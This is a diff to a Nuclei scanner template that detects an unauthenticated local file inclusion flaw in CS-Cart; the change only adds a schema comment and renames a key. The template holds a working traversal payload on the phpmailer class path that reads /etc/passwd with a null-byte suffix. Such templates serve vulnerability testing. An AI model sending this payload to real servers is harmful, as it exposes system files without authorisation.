@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: cs-cart-unauthenticated-lfi
 info:
   name: CS-Cart unauthenticated LFI
@@ -6,7 +7,7 @@ info:
   description: A vulnerability in CS-Cart allows remote unauthenticated attackers to access locally stored files and reveal their content.
   reference: https://cxsecurity.com/issue/WLB-2020100100
   tags: cscart,lfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00"
